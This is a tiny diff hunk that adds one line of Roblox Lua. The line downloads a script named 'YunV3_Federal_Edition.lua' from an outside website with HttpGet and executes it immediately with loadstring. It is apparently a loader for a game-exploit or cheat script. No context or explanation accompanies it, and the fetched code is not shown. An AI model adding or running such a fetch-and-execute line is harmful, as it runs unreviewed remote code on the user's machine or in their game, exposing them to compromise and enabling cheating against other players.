@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://fed.gay/files/yun/YunV3_Federal_Edition.lua"))()
